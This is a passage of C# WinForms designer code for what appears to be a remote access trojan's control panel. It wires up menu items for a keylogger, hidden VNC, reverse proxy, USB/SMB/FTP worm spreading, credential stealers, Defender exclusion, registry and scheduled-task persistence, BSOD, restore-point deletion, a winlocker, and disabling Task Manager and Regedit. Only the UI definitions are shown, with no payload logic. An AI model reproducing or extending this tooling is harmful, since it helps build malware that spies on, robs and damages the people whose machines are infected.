		this.programsToolStripMenuItem.Click += new System.EventHandler(programsToolStripMenuItem_Click);
		this.performanceToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("performanceToolStripMenuItem.Image");
		this.performanceToolStripMenuItem.Name = "performanceToolStripMenuItem";
		this.performanceToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.performanceToolStripMenuItem.Text = "Performance";
		this.performanceToolStripMenuItem.Click += new System.EventHandler(performanceToolStripMenuItem_Click);
		this.sToolStripMenuItem2.Name = "sToolStripMenuItem2";
		this.sToolStripMenuItem2.Size = new System.Drawing.Size(168, 6);
		this.shellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("shellToolStripMenuItem.Image");
		this.shellToolStripMenuItem.Name = "shellToolStripMenuItem";
		this.shellToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.shellToolStripMenuItem.Text = "Shell";
		this.shellToolStripMenuItem.Click += new System.EventHandler(shellToolStripMenuItem_Click);
		this.fastRunToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fastRunToolStripMenuItem.Image");
		this.fastRunToolStripMenuItem.Name = "fastRunToolStripMenuItem";
		this.fastRunToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.fastRunToolStripMenuItem.Text = "Fast run";
		this.fastRunToolStripMenuItem.Click += new System.EventHandler(fastRunToolStripMenuItem_Click);
		this.sToolStripMenuItem3.Name = "sToolStripMenuItem3";
		this.sToolStripMenuItem3.Size = new System.Drawing.Size(168, 6);
		this.mapToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("mapToolStripMenuItem.Image");
		this.mapToolStripMenuItem.Name = "mapToolStripMenuItem";
		this.mapToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.mapToolStripMenuItem.Text = "Map";
		this.mapToolStripMenuItem.Click += new System.EventHandler(mapToolStripMenuItem_Click);
		this.toolStripMenuItem30.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem30.Image");
		this.toolStripMenuItem30.Name = "toolStripMenuItem30";
		this.toolStripMenuItem30.Size = new System.Drawing.Size(171, 22);
		this.toolStripMenuItem30.Text = "Clipboard";
		this.toolStripMenuItem30.Click += new System.EventHandler(toolStripMenuItem30_Click);
		this.keyLoggerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("keyLoggerToolStripMenuItem.Image");
		this.keyLoggerToolStripMenuItem.Name = "keyLoggerToolStripMenuItem";
		this.keyLoggerToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.keyLoggerToolStripMenuItem.Text = "Key Logger";
		this.keyLoggerToolStripMenuItem.Click += new System.EventHandler(keyLoggerToolStripMenuItem_Click);
		this.keyLoggerDownloadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("keyLoggerDownloadToolStripMenuItem.Image");
		this.keyLoggerDownloadToolStripMenuItem.Name = "keyLoggerDownloadToolStripMenuItem";
		this.keyLoggerDownloadToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.keyLoggerDownloadToolStripMenuItem.Text = "Key Logger Panel";
		this.keyLoggerDownloadToolStripMenuItem.Click += new System.EventHandler(keyLoggerDownloadToolStripMenuItem_Click);
		this.controlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[14]
		{
			this.sendFileToolStripMenuItem, this.reverseProxyToolStripMenuItem, this.hVNCToolStripMenuItem, this.sToolStripMenuItem4, this.webSiteToolStripMenuItem, this.processBlockToolStripMenuItem, this.reportWindowToolStripMenuItem, this.funToolStripMenuItem, this.chatToolStripMenuItem, this.changeWallpaperToolStripMenuItem,
			this.volumeToolStripMenuItem, this.botSpeakerToolStripMenuItem, this.notepadToolStripMenuItem, this.hostFileToolStripMenuItem
		});
		this.controlToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("controlToolStripMenuItem.Image");
		this.controlToolStripMenuItem.Name = "controlToolStripMenuItem";
		this.controlToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.controlToolStripMenuItem.Text = "Control";
		this.sendFileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.fromDiskToolStripMenuItem, this.fromMemoryToolStripMenuItem, this.fromLinkToolStripMenuItem, this.shellCodeToolStripMenuItem });
		this.sendFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("sendFileToolStripMenuItem.Image");
		this.sendFileToolStripMenuItem.Name = "sendFileToolStripMenuItem";
		this.sendFileToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.sendFileToolStripMenuItem.Text = "Send File";
		this.fromDiskToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fromDiskToolStripMenuItem.Image");
		this.fromDiskToolStripMenuItem.Name = "fromDiskToolStripMenuItem";
		this.fromDiskToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.fromDiskToolStripMenuItem.Text = "From Disk";
		this.fromDiskToolStripMenuItem.Click += new System.EventHandler(fromDiskToolStripMenuItem_Click);
		this.fromMemoryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fromMemoryToolStripMenuItem.Image");
		this.fromMemoryToolStripMenuItem.Name = "fromMemoryToolStripMenuItem";
		this.fromMemoryToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.fromMemoryToolStripMenuItem.Text = "From Memory";
		this.fromMemoryToolStripMenuItem.Click += new System.EventHandler(fromMemoryToolStripMenuItem_Click);
		this.fromLinkToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fromLinkToolStripMenuItem.Image");
		this.fromLinkToolStripMenuItem.Name = "fromLinkToolStripMenuItem";
		this.fromLinkToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.fromLinkToolStripMenuItem.Text = "From Link";
		this.fromLinkToolStripMenuItem.Click += new System.EventHandler(fromLinkToolStripMenuItem_Click);
		this.shellCodeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("shellCodeToolStripMenuItem.Image");
		this.shellCodeToolStripMenuItem.Name = "shellCodeToolStripMenuItem";
		this.shellCodeToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.shellCodeToolStripMenuItem.Text = "Shell Code";
		this.shellCodeToolStripMenuItem.Click += new System.EventHandler(shellCodeToolStripMenuItem_Click);
		this.reverseProxyToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("reverseProxyToolStripMenuItem.Image");
		this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
		this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
		this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(reverseProxyToolStripMenuItem_Click);
		this.hVNCToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hVNCToolStripMenuItem.Image");
		this.hVNCToolStripMenuItem.Name = "hVNCToolStripMenuItem";
		this.hVNCToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.hVNCToolStripMenuItem.Text = "HVNC";
		this.hVNCToolStripMenuItem.Click += new System.EventHandler(hVNCToolStripMenuItem_Click);
		this.sToolStripMenuItem4.Name = "sToolStripMenuItem4";
		this.sToolStripMenuItem4.Size = new System.Drawing.Size(174, 6);
		this.webSiteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.vIsbleToolStripMenuItem, this.invisibleToolStripMenuItem });
		this.webSiteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("webSiteToolStripMenuItem.Image");
		this.webSiteToolStripMenuItem.Name = "webSiteToolStripMenuItem";
		this.webSiteToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.webSiteToolStripMenuItem.Text = "Web Site";
		this.vIsbleToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("vIsbleToolStripMenuItem.Image");
		this.vIsbleToolStripMenuItem.Name = "vIsbleToolStripMenuItem";
		this.vIsbleToolStripMenuItem.Size = new System.Drawing.Size(119, 22);
		this.vIsbleToolStripMenuItem.Text = "Visble";
		this.vIsbleToolStripMenuItem.Click += new System.EventHandler(vIsbleToolStripMenuItem_Click);
		this.invisibleToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("invisibleToolStripMenuItem.Image");
		this.invisibleToolStripMenuItem.Name = "invisibleToolStripMenuItem";
		this.invisibleToolStripMenuItem.Size = new System.Drawing.Size(119, 22);
		this.invisibleToolStripMenuItem.Text = "Invisible";
		this.invisibleToolStripMenuItem.Click += new System.EventHandler(invisibleToolStripMenuItem_Click);
		this.processBlockToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.killToolStripMenuItem, this.deadToolStripMenuItem });
		this.processBlockToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("processBlockToolStripMenuItem.Image");
		this.processBlockToolStripMenuItem.Name = "processBlockToolStripMenuItem";
		this.processBlockToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.processBlockToolStripMenuItem.Text = "Anti process";
		this.killToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("killToolStripMenuItem.Image");
		this.killToolStripMenuItem.Name = "killToolStripMenuItem";
		this.killToolStripMenuItem.Size = new System.Drawing.Size(104, 22);
		this.killToolStripMenuItem.Text = "Kill";
		this.killToolStripMenuItem.Click += new System.EventHandler(killToolStripMenuItem_Click);
		this.deadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deadToolStripMenuItem.Image");
		this.deadToolStripMenuItem.Name = "deadToolStripMenuItem";
		this.deadToolStripMenuItem.Size = new System.Drawing.Size(104, 22);
		this.deadToolStripMenuItem.Text = "Dead";
		this.deadToolStripMenuItem.Click += new System.EventHandler(deadToolStripMenuItem_Click);
		this.reportWindowToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.startToolStripMenuItem, this.stopToolStripMenuItem });
		this.reportWindowToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("reportWindowToolStripMenuItem.Image");
		this.reportWindowToolStripMenuItem.Name = "reportWindowToolStripMenuItem";
		this.reportWindowToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.reportWindowToolStripMenuItem.Text = "Report Window";
		this.startToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem.Image");
		this.startToolStripMenuItem.Name = "startToolStripMenuItem";
		this.startToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
		this.startToolStripMenuItem.Text = "Start";
		this.startToolStripMenuItem.Click += new System.EventHandler(startToolStripMenuItem_Click);
		this.stopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem.Image");
		this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
		this.stopToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
		this.stopToolStripMenuItem.Text = "Stop";
		this.stopToolStripMenuItem.Click += new System.EventHandler(stopToolStripMenuItem_Click);
		this.funToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("funToolStripMenuItem.Image");
		this.funToolStripMenuItem.Name = "funToolStripMenuItem";
		this.funToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.funToolStripMenuItem.Text = "Fun";
		this.funToolStripMenuItem.Click += new System.EventHandler(funToolStripMenuItem_Click);
		this.chatToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("chatToolStripMenuItem.Image");
		this.chatToolStripMenuItem.Name = "chatToolStripMenuItem";
		this.chatToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.chatToolStripMenuItem.Text = "Chat";
		this.chatToolStripMenuItem.Click += new System.EventHandler(chatToolStripMenuItem_Click);
		this.changeWallpaperToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("changeWallpaperToolStripMenuItem.Image");
		this.changeWallpaperToolStripMenuItem.Name = "changeWallpaperToolStripMenuItem";
		this.changeWallpaperToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.changeWallpaperToolStripMenuItem.Text = "Change Wallpaper";
		this.changeWallpaperToolStripMenuItem.Click += new System.EventHandler(changeWallpaperToolStripMenuItem_Click);
		this.volumeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("volumeToolStripMenuItem.Image");
		this.volumeToolStripMenuItem.Name = "volumeToolStripMenuItem";
		this.volumeToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.volumeToolStripMenuItem.Text = "Volume";
		this.volumeToolStripMenuItem.Click += new System.EventHandler(volumeToolStripMenuItem_Click);
		this.botSpeakerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("botSpeakerToolStripMenuItem.Image");
		this.botSpeakerToolStripMenuItem.Name = "botSpeakerToolStripMenuItem";
		this.botSpeakerToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.botSpeakerToolStripMenuItem.Text = "Bot Speaker";
		this.botSpeakerToolStripMenuItem.Click += new System.EventHandler(botSpeakerToolStripMenuItem_Click);
		this.notepadToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("notepadToolStripMenuItem.Image");
		this.notepadToolStripMenuItem.Name = "notepadToolStripMenuItem";
		this.notepadToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.notepadToolStripMenuItem.Text = "Notepad";
		this.notepadToolStripMenuItem.Click += new System.EventHandler(notepadToolStripMenuItem_Click);
		this.hostFileToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hostFileToolStripMenuItem.Image");
		this.hostFileToolStripMenuItem.Name = "hostFileToolStripMenuItem";
		this.hostFileToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.hostFileToolStripMenuItem.Text = "Hosts File";
		this.hostFileToolStripMenuItem.Click += new System.EventHandler(hostFileToolStripMenuItem_Click);
		this.malwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[31]
		{
			this.autoRunToolStripMenuItem1, this.toolStripMenuItem114, this.wormsToolStripMenuItem, this.stealthSaverToolStripMenuItem, this.botKillerToolStripMenuItem, this.windowsExceToolStripMenuItem, this.pluginClearToolStripMenuItem, this.sToolStripMenuItem5, this.fileSearcherToolStripMenuItem, this.stealerToolStripMenuItem,
			this.toolStripMenuItem80, this.sToolStripMenuItem9, this.keyLoggerSetupToolStripMenuItem, this.keyLoggerUninstallToolStripMenuItem, this.sToolStripMenuItem6, this.installNfx3ToolStripMenuItem, this.bSODToolStripMenuItem, this.deletePointsToolStripMenuItem, this.resetScaleToolStripMenuItem, this.winlockerToolStripMenuItem,
			this.toolStripSeparator1, this.toolStripMenuItem15, this.toolStripMenuItem9, this.taskMgrToolStripMenuItem, this.toolStripMenuItem21, this.sToolStripMenuItem10, this.toolStripMenuItem27, this.toolStripMenuItem4, this.toolStripMenuItem18, this.toolStripMenuItem31,
			this.toolStripMenuItem24
		});
		this.malwareToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("malwareToolStripMenuItem.Image");
		this.malwareToolStripMenuItem.Name = "malwareToolStripMenuItem";
		this.malwareToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.malwareToolStripMenuItem.Text = "Action";
		this.autoRunToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.startupToolStripMenuItem, this.toolStripMenuItem106, this.schtaskToolStripMenuItem, this.regUserToolStripMenuItem, this.regMachineToolStripMenuItem, this.regUserinitToolStripMenuItem });
		this.autoRunToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("autoRunToolStripMenuItem1.Image");
		this.autoRunToolStripMenuItem1.Name = "autoRunToolStripMenuItem1";
		this.autoRunToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
		this.autoRunToolStripMenuItem1.Text = "Auto Run";
		this.startupToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("startupToolStripMenuItem.Image");
		this.startupToolStripMenuItem.Name = "startupToolStripMenuItem";
		this.startupToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
		this.startupToolStripMenuItem.Text = "Startup";
		this.startupToolStripMenuItem.Click += new System.EventHandler(startupToolStripMenuItem_Click);
		this.toolStripMenuItem106.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem106.Image");
		this.toolStripMenuItem106.Name = "toolStripMenuItem106";
		this.toolStripMenuItem106.Size = new System.Drawing.Size(162, 22);
		this.toolStripMenuItem106.Text = "Schtask";
		this.toolStripMenuItem106.Click += new System.EventHandler(toolStripMenuItem106_Click);
		this.schtaskToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("schtaskToolStripMenuItem.Image");
		this.schtaskToolStripMenuItem.Name = "schtaskToolStripMenuItem";
		this.schtaskToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
		this.schtaskToolStripMenuItem.Text = "Schtask highest";
		this.schtaskToolStripMenuItem.Click += new System.EventHandler(schtaskToolStripMenuItem_Click);
		this.regUserToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("regUserToolStripMenuItem.Image");
		this.regUserToolStripMenuItem.Name = "regUserToolStripMenuItem";
		this.regUserToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
		this.regUserToolStripMenuItem.Text = "Reg user";
		this.regUserToolStripMenuItem.Click += new System.EventHandler(regUserToolStripMenuItem_Click);
		this.regMachineToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("regMachineToolStripMenuItem.Image");
		this.regMachineToolStripMenuItem.Name = "regMachineToolStripMenuItem";
		this.regMachineToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
		this.regMachineToolStripMenuItem.Text = "Reg machine";
		this.regMachineToolStripMenuItem.Click += new System.EventHandler(regMachineToolStripMenuItem_Click);
		this.regUserinitToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("regUserinitToolStripMenuItem.Image");
		this.regUserinitToolStripMenuItem.Name = "regUserinitToolStripMenuItem";
		this.regUserinitToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
		this.regUserinitToolStripMenuItem.Text = "Reg userinit";
		this.regUserinitToolStripMenuItem.Click += new System.EventHandler(regUserinitToolStripMenuItem_Click);
		this.toolStripMenuItem114.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem115, this.toolStripMenuItem116 });
		this.toolStripMenuItem114.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem114.Image");
		this.toolStripMenuItem114.Name = "toolStripMenuItem114";
		this.toolStripMenuItem114.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem114.Text = "Process Critical";
		this.toolStripMenuItem115.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem115.Image");
		this.toolStripMenuItem115.Name = "toolStripMenuItem115";
		this.toolStripMenuItem115.Size = new System.Drawing.Size(134, 22);
		this.toolStripMenuItem115.Text = "Set Critical";
		this.toolStripMenuItem115.Click += new System.EventHandler(toolStripMenuItem115_Click);
		this.toolStripMenuItem116.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem116.Image");
		this.toolStripMenuItem116.Name = "toolStripMenuItem116";
		this.toolStripMenuItem116.Size = new System.Drawing.Size(134, 22);
		this.toolStripMenuItem116.Text = "Exit Critical";
		this.toolStripMenuItem116.Click += new System.EventHandler(toolStripMenuItem116_Click);
		this.wormsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("wormsToolStripMenuItem.Image");
		this.wormsToolStripMenuItem.Name = "wormsToolStripMenuItem";
		this.wormsToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.wormsToolStripMenuItem.Text = "Worm (usb/smb/Ftp)";
		this.wormsToolStripMenuItem.Click += new System.EventHandler(wormsToolStripMenuItem_Click);
		this.stealthSaverToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("stealthSaverToolStripMenuItem.Image");
		this.stealthSaverToolStripMenuItem.Name = "stealthSaverToolStripMenuItem";
		this.stealthSaverToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.stealthSaverToolStripMenuItem.Text = "Stealth Saver";
		this.stealthSaverToolStripMenuItem.Click += new System.EventHandler(stealthSaverToolStripMenuItem_Click);
		this.botKillerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("botKillerToolStripMenuItem.Image");
		this.botKillerToolStripMenuItem.Name = "botKillerToolStripMenuItem";
		this.botKillerToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.botKillerToolStripMenuItem.Text = "Bot Killer";
		this.botKillerToolStripMenuItem.Click += new System.EventHandler(botKillerToolStripMenuItem_Click);
		this.windowsExceToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("windowsExceToolStripMenuItem.Image");
		this.windowsExceToolStripMenuItem.Name = "windowsExceToolStripMenuItem";
		this.windowsExceToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.windowsExceToolStripMenuItem.Text = "Defender Exclusion";
		this.windowsExceToolStripMenuItem.Click += new System.EventHandler(windowsExceToolStripMenuItem_Click);
		this.pluginClearToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("pluginClearToolStripMenuItem.Image");
		this.pluginClearToolStripMenuItem.Name = "pluginClearToolStripMenuItem";
		this.pluginClearToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.pluginClearToolStripMenuItem.Text = "Plugin Clear";
		this.pluginClearToolStripMenuItem.Click += new System.EventHandler(pluginClearToolStripMenuItem_Click);
		this.sToolStripMenuItem5.Name = "sToolStripMenuItem5";
		this.sToolStripMenuItem5.Size = new System.Drawing.Size(185, 6);
		this.fileSearcherToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fileSearcherToolStripMenuItem.Image");
		this.fileSearcherToolStripMenuItem.Name = "fileSearcherToolStripMenuItem";
		this.fileSearcherToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.fileSearcherToolStripMenuItem.Text = "File Searcher";
		this.fileSearcherToolStripMenuItem.Click += new System.EventHandler(fileSearcherToolStripMenuItem_Click);
		this.stealerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("stealerToolStripMenuItem.Image");
		this.stealerToolStripMenuItem.Name = "stealerToolStripMenuItem";
		this.stealerToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.stealerToolStripMenuItem.Text = "Stealer Old";
		this.stealerToolStripMenuItem.Click += new System.EventHandler(stealerToolStripMenuItem_Click);
		this.toolStripMenuItem80.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem80.Image");
		this.toolStripMenuItem80.Name = "toolStripMenuItem80";
		this.toolStripMenuItem80.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem80.Text = "Stealer new";
		this.toolStripMenuItem80.Click += new System.EventHandler(toolStripMenuItem80_Click);
		this.sToolStripMenuItem9.Name = "sToolStripMenuItem9";
		this.sToolStripMenuItem9.Size = new System.Drawing.Size(185, 6);
		this.keyLoggerSetupToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("keyLoggerSetupToolStripMenuItem.Image");
		this.keyLoggerSetupToolStripMenuItem.Name = "keyLoggerSetupToolStripMenuItem";
		this.keyLoggerSetupToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.keyLoggerSetupToolStripMenuItem.Text = "Key Logger Setup";
		this.keyLoggerSetupToolStripMenuItem.Click += new System.EventHandler(keyLoggerSetupToolStripMenuItem_Click);
		this.keyLoggerUninstallToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("keyLoggerUninstallToolStripMenuItem.Image");
		this.keyLoggerUninstallToolStripMenuItem.Name = "keyLoggerUninstallToolStripMenuItem";
		this.keyLoggerUninstallToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.keyLoggerUninstallToolStripMenuItem.Text = "Key Logger Uninstall";
		this.keyLoggerUninstallToolStripMenuItem.Click += new System.EventHandler(keyLoggerUninstallToolStripMenuItem_Click);
		this.sToolStripMenuItem6.Name = "sToolStripMenuItem6";
		this.sToolStripMenuItem6.Size = new System.Drawing.Size(185, 6);
		this.installNfx3ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("installNfx3ToolStripMenuItem.Image");
		this.installNfx3ToolStripMenuItem.Name = "installNfx3ToolStripMenuItem";
		this.installNfx3ToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.installNfx3ToolStripMenuItem.Text = "Install Nfx3";
		this.installNfx3ToolStripMenuItem.Click += new System.EventHandler(installNfx3ToolStripMenuItem_Click);
		this.bSODToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("bSODToolStripMenuItem.Image");
		this.bSODToolStripMenuItem.Name = "bSODToolStripMenuItem";
		this.bSODToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.bSODToolStripMenuItem.Text = "BSOD";
		this.bSODToolStripMenuItem.Click += new System.EventHandler(bSODToolStripMenuItem_Click);
		this.deletePointsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deletePointsToolStripMenuItem.Image");
		this.deletePointsToolStripMenuItem.Name = "deletePointsToolStripMenuItem";
		this.deletePointsToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.deletePointsToolStripMenuItem.Text = "Delete Restore";
		this.deletePointsToolStripMenuItem.Click += new System.EventHandler(deletePointsToolStripMenuItem_Click);
		this.resetScaleToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("resetScaleToolStripMenuItem.Image");
		this.resetScaleToolStripMenuItem.Name = "resetScaleToolStripMenuItem";
		this.resetScaleToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.resetScaleToolStripMenuItem.Text = "Reset Scale";
		this.resetScaleToolStripMenuItem.Click += new System.EventHandler(resetScaleToolStripMenuItem_Click);
		this.winlockerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("winlockerToolStripMenuItem.Image");
		this.winlockerToolStripMenuItem.Name = "winlockerToolStripMenuItem";
		this.winlockerToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.winlockerToolStripMenuItem.Text = "Winlocker";
		this.winlockerToolStripMenuItem.Click += new System.EventHandler(winlockerToolStripMenuItem_Click);
		this.toolStripSeparator1.Name = "toolStripSeparator1";
		this.toolStripSeparator1.Size = new System.Drawing.Size(185, 6);
		this.toolStripMenuItem15.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem16, this.toolStripMenuItem17 });
		this.toolStripMenuItem15.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem15.Image");
		this.toolStripMenuItem15.Name = "toolStripMenuItem15";
		this.toolStripMenuItem15.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem15.Text = "Regedit";
		this.toolStripMenuItem16.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem16.Image");
		this.toolStripMenuItem16.Name = "toolStripMenuItem16";
		this.toolStripMenuItem16.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem16.Text = "Enable";
		this.toolStripMenuItem16.Click += new System.EventHandler(toolStripMenuItem16_Click);
		this.toolStripMenuItem17.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem17.Image");
		this.toolStripMenuItem17.Name = "toolStripMenuItem17";
		this.toolStripMenuItem17.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem17.Text = "Disable";
		this.toolStripMenuItem17.Click += new System.EventHandler(toolStripMenuItem17_Click);
		this.toolStripMenuItem9.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem10, this.toolStripMenuItem14 });
		this.toolStripMenuItem9.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem9.Image");
		this.toolStripMenuItem9.Name = "toolStripMenuItem9";
		this.toolStripMenuItem9.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem9.Text = "Task mgr";
		this.toolStripMenuItem10.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem10.Image");
		this.toolStripMenuItem10.Name = "toolStripMenuItem10";
		this.toolStripMenuItem10.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem10.Text = "Enable";
		this.toolStripMenuItem10.Click += new System.EventHandler(toolStripMenuItem10_Click);
		this.toolStripMenuItem14.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem14.Image");
		this.toolStripMenuItem14.Name = "toolStripMenuItem14";
		this.toolStripMenuItem14.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem14.Text = "Disable";
		this.toolStripMenuItem14.Click += new System.EventHandler(toolStripMenuItem14_Click);
		this.taskMgrToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.enableToolStripMenuItem, this.disableToolStripMenuItem });
		this.taskMgrToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("taskMgrToolStripMenuItem.Image");
		this.taskMgrToolStripMenuItem.Name = "taskMgrToolStripMenuItem";
		this.taskMgrToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
		this.taskMgrToolStripMenuItem.Text = "Shell";
		this.enableToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("enableToolStripMenuItem.Image");
		this.enableToolStripMenuItem.Name = "enableToolStripMenuItem";
		this.enableToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
		this.enableToolStripMenuItem.Text = "Enable";
		this.enableToolStripMenuItem.Click += new System.EventHandler(enableToolStripMenuItem_Click);
		this.disableToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("disableToolStripMenuItem.Image");
		this.disableToolStripMenuItem.Name = "disableToolStripMenuItem";
		this.disableToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
		this.disableToolStripMenuItem.Text = "Disable";
		this.disableToolStripMenuItem.Click += new System.EventHandler(disableToolStripMenuItem_Click);
